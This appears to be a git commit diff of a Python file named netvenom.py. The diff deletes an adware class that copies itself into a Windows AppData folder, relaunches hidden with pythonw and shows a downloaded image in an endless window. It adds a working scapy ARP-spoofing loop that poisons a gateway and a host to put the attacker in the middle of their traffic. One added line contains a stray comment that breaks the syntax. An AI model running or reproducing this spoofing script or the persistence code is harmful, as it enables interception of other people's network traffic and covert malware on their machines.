3e12db05900a63dad3d45aabc9b0400e5936c27c
p3xsouger <f22dm0486@student.nafa.edu.sg>
2024-07-09 06:24:06 +0700

    netvenom.py
    spoof protocol

--- netvenom.py
+++ netvenom.py
@@ -3,65 +3,38 @@ import sys
 import platform
 import urllib.request
 import cv2
+import scapy.all as scapy
 from distutils.dir_util import copy_tree
 
+def restore_defaults(dest, source):
+    target_mac = get_mac(dest)
+    source_mac = get_mac(source)
+    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
+    scapy.send(packet, verbose=False)
 
-base_path = os.path.dirname(os.path.abspath(__file__))
+def get_mac(ip):
+    request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    final_packet = broadcast / request
+    answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
+    mac = answer[0][1].hwsrc
+    return mac
 
+def spoofing(target, spoofed):
+    mac = get_mac(target)
+    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
+    scapy.send(packet, verbose=False)
 
-class AdManager(object):
-    url = ""
-    extension = ""
-
-    def __init__(self):
-        if platform.system() == "Windows":
-            dest_path = os.getenv("LOCALAPPDATA") + "\Windows"
-            # print(base_path)
-            # print(dest_path)
-
-            if base_path != dest_path:
-                print("Migration started...")
-                copy_tree(base_path, dest_path)
-                print("Migration completed")
-
-                file_path = dest_path + "\\netvenom.py"
-                print("Executing new file: " + file_path)
-                print("python " + file_path)
-
-                ''' NOTE
-                Use 'pythonw' command instead of 'python'.
-                'pythonw' will run our malicious script in background
-                '''
-                result = os.system("pythonw " + file_path)
-
-                print("Closing old file")
-                sys.exit(0)
-            else:
-                print("Good directory")
-
-        self.new_file_name = ""
-
-    def process_file(self):
-        file_name, _ = urllib.request.urlretrieve(self.url)
-        base = os.path.splitext(file_name)[0]
-        self.new_file_name = base + self.extension
-        os.rename(file_name, self.new_file_name)
-
-    def show_window(self):
-        image_ad = cv2.imread(self.new_file_name)
-        image_ad = cv2.resize(image_ad, (300, 300))
-
+def main():
+    try:
         while True:
-            cv2.moveWindow("ad", 0, 0)
-            cv2.imshow("ad", image_ad)
-            cv2.waitKey(0)
+            spoofing("192.168.1.1", "192.168.1.130") (source, dest -> attacker machine)
+            spoofing("192.168.1.130", "192.168.1.1")
+    except KeyboardInterrupt:
+        print("[!] Process stopped. Restoring defaults .. please hold")
+        restore_defaults("192.168.1.1", "192.168.1.130")
+        restore_defaults("192.168.1.130", "192.168.1.1")
+        exit(0)
 
-    def execute_adware(self):
-        self.process_file()
-        self.show_window()
-
-
-ad = AdManager()
-ad.url = "http://.jpg"
-ad.extension = ".jpg"
-ad.execute_adware()
+if __name__ == "__main__":
+    main()
